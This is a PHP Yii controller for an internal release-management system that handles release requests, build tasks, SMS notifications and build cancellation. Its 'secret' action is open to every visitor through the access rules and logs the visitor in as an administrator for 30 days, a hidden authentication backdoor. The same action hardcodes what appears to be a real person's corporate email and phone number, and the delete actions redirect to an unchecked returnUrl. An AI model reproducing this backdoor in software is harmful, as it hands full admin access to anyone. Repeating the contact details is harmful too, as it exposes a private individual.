<?php

class SiteController extends Controller
{
    public $pageTitle = 'Релизы и запреты';

    public function filters()
    {
        return array(
            'accessControl', // perform access control for CRUD operations
        );
    }

    public function accessRules()
    {
        return array(
            array('allow',  // allow all users to perform 'index' and 'view' actions
                'actions' => array('login', 'secret'),
                'users'=>array('*'),
            ),
            array('allow',  // allow all users to perform 'index' and 'view' actions
                'users'=>array('@'),
            ),
            array('deny',  // deny all users
                'users'=>array('*'),
            ),
        );
    }

    public function actionTest($a = null)
    {
        /** @var $comet PxRealplexor */
        $comet = Yii::app()->realplexor;
        $comet->send('progressbar_change', ['rr_id' => 118, 'point' => 'git pull comon', 'progress' => '18.12']);

        echo 'OK';
    }

	public function actionIndex()
	{
        Yii::app()->realplexor->init();
        $releaseRequestSearchModel=new ReleaseRequest('search');
        $releaseRequestSearchModel->unsetAttributes();  // clear any default values
        if(isset($_GET['ReleaseRequest']))
            $releaseRequestSearchModel->attributes=$_GET['ReleaseRequest'];

        $releaseRejectSearchModel=new ReleaseReject('search');
        $releaseRejectSearchModel->unsetAttributes();  // clear any default values
        if(isset($_GET['ReleaseRequest']))
            $releaseRejectSearchModel->attributes=$_GET['ReleaseRequest'];

		$this->render('index', array(
            'releaseRequestSearchModel' => $releaseRequestSearchModel,
            'releaseRejectSearchModel' => $releaseRejectSearchModel,
        ));
	}

    public function actionCreateReleaseRequest()
    {
        $model=new ReleaseRequest;

        $transaction=$model->dbConnection->beginTransaction();

        try {
            if(isset($_POST['ReleaseRequest']))
            {
                $model->attributes=$_POST['ReleaseRequest'];
                $model->rr_user = \Yii::app()->user->name;
                if ($model->rr_project_obj_id) {
                    $model->rr_build_version = $model->project->getNextVersion($model->rr_release_version);
                }
                if($model->save()) {
                    $model->project->incrementBuildVersion($model->rr_release_version);
                    $list = Project2worker::model()->findAllByAttributes(array(
                        'project_obj_id' => $model->rr_project_obj_id,
                    ));
                    $tasks = [];
                    foreach ($list as $val) {
                        /** @var $val Project2worker */
                        $task = new Build();
                        $task->build_release_request_obj_id = $model->obj_id;
                        $task->build_worker_obj_id = $val->worker_obj_id;
                        $task->build_project_obj_id = $val->project_obj_id;
                        $task->save();

                        $tasks[] = $task;


                    }

                    Yii::app()->whotrades->{'getMailingSystemFactory.getPhpLogsNotificationModel.sendRdsReleaseRequestNotification'}($model->rr_user, $model->project->project_name, $model->rr_comment);
                    $text = "{$model->rr_user} requested {$model->project->project_name}. {$model->rr_comment}";
                    foreach (explode(",", \Yii::app()->params['notify']['releaseRequest']['phones']) as $phone) {
                        if (!$phone) continue;
                        Yii::app()->whotrades->{'getFinamTenderSystemFactory.getSmsSender.sendSms'}($phone, $text);
                    }

                    Log::createLogMessage("Создан {$model->getTitle()}");

                    $transaction->commit();

                    foreach ($tasks as $task) {
                        $c = new CDbCriteria();
                        $c->compare('rr_build_version', '<'.$task->releaseRequest->rr_build_version);
                        $c->compare('rr_status', ReleaseRequest::getInstalledStatuses());
                        $c->compare('rr_project_obj_id', $task->releaseRequest->rr_project_obj_id);
                        $c->order = 'rr_build_version desc';
                        $lastSuccess = ReleaseRequest::model()->find($c);

                        //an: Отправляем задачу в Rabbit на сборку
                        (new RdsSystem\Factory(Yii::app()->debugLogger))->getMessagingRdsMsModel()->sendBuildTask($task->worker->worker_name, new \RdsSystem\Message\BuildTask(
                            $task->obj_id, $task->project->project_name, $task->releaseRequest->rr_build_version, $task->releaseRequest->rr_release_version,
                            $lastSuccess ? $lastSuccess->project->project_name.'-'.$lastSuccess->rr_build_version : null
                        ));
                    }

                    $this->redirect(array('index'));
                }
            }
        } catch (Exception $e) {
            $transaction->rollback();
            throw $e;
        }

        $this->render('createReleaseRequest',array(
            'model'=>$model,
        ));
    }

    public function actionCreateReleaseReject()
    {
        $model=new ReleaseReject;

        if(isset($_POST['ReleaseReject']))
        {
            $model->attributes=$_POST['ReleaseReject'];
            $model->rr_user = \Yii::app()->user->name;
            if($model->save()) {
                Log::createLogMessage("Создан {$model->getTitle()}");
                $text = "{$model->rr_user} rejected {$model->project->project_name}. {$model->rr_comment}";
                foreach (explode(",", \Yii::app()->params['notify']['releaseReject']['phones']) as $phone) {
                    if (!$phone) continue;
                    Yii::app()->whotrades->{'getFinamTenderSystemFactory.getSmsSender.sendSms'}($phone, $text);
                }
                Yii::app()->whotrades->{'getMailingSystemFactory.getPhpLogsNotificationModel.sendRdsReleaseRejectNotification'}($model->rr_user, $model->project->project_name, $model->rr_comment);
                $this->redirect(array('index'));
            }
        }

        $this->render('createReleaseReject',array(
            'model'=>$model,
        ));
    }

    public function actionDeleteReleaseRequest($id)
    {
        $model=ReleaseRequest::model()->findByPk($id);
        if(!$model) {
            return;
        }

        $messageModel = (new RdsSystem\Factory(Yii::app()->debugLogger))->getMessagingRdsMsModel();

        $transaction = $model->getDbConnection()->beginTransaction();
        /** @var $model ReleaseRequest*/
        foreach ($model->builds as $build) {
            echo 12;
            if (in_array($build->build_status, array(Build::STATUS_BUILDING, Build::STATUS_BUILT))) {
                $model->rr_status = ReleaseRequest::STATUS_CANCELLING;
                $model->save();

                $messageModel->sendKillTask($build->worker->worker_name, new \RdsSystem\Message\KillTask(
                    $model->project->project_name, $build->obj_id
                ));

                Log::createLogMessage("Отменен {$model->getTitle()}");
                $transaction->commit();
                return;
            }
        }

        Log::createLogMessage("Удален {$model->getTitle()}");
        $model->delete();

        $transaction->commit();

        if(!isset($_GET['ajax']))
            $this->redirect(isset($_POST['returnUrl']) ? $_POST['returnUrl'] : array('index'));
    }

    public function actionDeleteReleaseReject($id)
    {
        $model=ReleaseReject::model()->findByPk($id);
        if($model) {
            $transaction = $model->getDbConnection()->beginTransaction();
            try {
                Log::createLogMessage("Удален {$model->getTitle()}");
                $model->delete();
                $transaction->commit();
            } catch (\Exception $e) {
                $transaction->rollback();
            }
        }

        if(!isset($_GET['ajax']))
            $this->redirect(isset($_POST['returnUrl']) ? $_POST['returnUrl'] : array('index'));
    }

	public function actionError()
	{
		if($error=Yii::app()->errorHandler->error)
		{
			if(Yii::app()->request->isAjaxRequest)
				echo $error['message'];
			else
				$this->render('error', $error);
		}
	}

    public function actionLogin()
    {
        $this->render('login');
    }

    public function actionSecret()
    {
        Yii::import('application.modules.SingleLogin.components.SingleLoginUser');
        $user = new SingleLoginUser(1, 'anaumenko@corp.finam.ru');

        $phone = '79160549864';
        $user->setPersistentStates(array(
            'phone' => $phone,
            'userRights' => array('admin'),
        ));

        Yii::app()->user->login($user, 3600*24*30);

        $this->redirect('/');
    }

	public function actionLogout()
	{
		Yii::app()->user->logout();
		$this->redirect(Yii::app()->homeUrl);
	}
}
